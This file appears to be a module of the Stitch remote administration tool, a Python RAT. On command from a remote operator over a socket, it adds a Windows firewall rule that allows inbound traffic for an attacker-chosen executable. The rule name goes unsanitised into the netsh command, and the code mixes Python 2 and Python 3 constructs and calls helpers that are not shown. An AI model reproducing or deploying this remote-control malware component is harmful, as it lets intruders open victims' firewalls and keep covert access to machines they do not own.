# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import _winreg
import subprocess

ext = ['.jar','.py','.exe','.application','.msi','.msc','.bat','.cmd'\
        ,'.vb','.vbs','.vbe','.js','.jse','wse','.ws','.wsc','.ps1','.ps2'\
        ,'.msh','.msh1','.msh2','.mshxml','.lnk']

allow = receive(client_socket)
rule = receive(client_socket)
if allow.endswith(tuple(ext)):
    if os.path.exists(allow):
        path = os.path.abspath(allow)
        cmd = f'netsh advfirewall firewall add rule name="{rule}" dir=in action=allow program="{path}" enable=yes'

        resp = run_command(cmd)
        if "Ok." in resp:
            resp = "[+] Command successfully executed\n"
    else:
        resp = f'[!] Path to "{allow}" could not be found\n'
else:
    resp = f'[!] "{allow}" is not a valid program\n'

send(client_socket,resp)
